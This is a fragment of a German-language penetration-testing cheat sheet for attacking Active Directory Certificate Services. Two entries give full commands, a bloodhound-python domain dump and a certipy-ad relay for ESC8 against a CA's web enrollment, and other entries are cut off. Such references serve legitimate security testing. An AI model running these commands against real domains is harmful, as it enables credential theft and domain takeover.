...
% p-adcs, boris, certipy, recon, esc, esc1, esc8, vulnerable, find
...
% p-adcs, boris, certipy, bloodhound, esc1, analyse, oldbloodhound
...
% p-adcs, boris, bloodhound, collector, dump, esc1, python
## [ADCS-c] bloodhound-python - Dump (Users/Computer fuer ESC-Analyse)
-d domain=FQDN . -dc dc_fqdn=FQDN . -ns dc_ip=IP (DC ist DNS) . -u blank. Allgemeine Collection: tippe recon.
```
bloodhound-python -u <user> -p '<password>' -d <domain> -c all -dc <dc_fqdn> -ns <dc_ip> --zip
```

% p-adcs, boris, certipy, esc1, san, req, upn, template
...
% p-adcs, boris, certipy, esc8, webenrollment, kerberosauthentication, web
## [ADCS-e] certipy-ad - ESC8 Relay auf CA Web-Enrollment (URL-Schema)
Coerce den DC (tippe coerce) waehrend das hier laeuft. Alternative ntlmrelayx --adcs: tippe relay.
```
certipy-ad relay -target 'http://<ca_fqdn>' -template <template|KerberosAuthentication> -debug
```

% p-adcs, boris, certipy, ca, backup, goldencert, privatekey, capfx, cakey
...
% p-adcs, boris, certipy, forge, goldencert, sid, upn, crl, forgecert, capfx
...
% p-adcs, boris, certipy, auth, pfx, tgt, hash, pth, esc1, goldencert, creds
...
% p-adcs, boris, certipy, sid, getsid, domainsid, nxc, forge
## [ADCS-hilf] SID des Ziels holen (fuer forge -sid)
Domain-SID + RID: DA = <domain_sid>-500. Alternativ steht die SID in bloodhound / certipy-ad find.
```
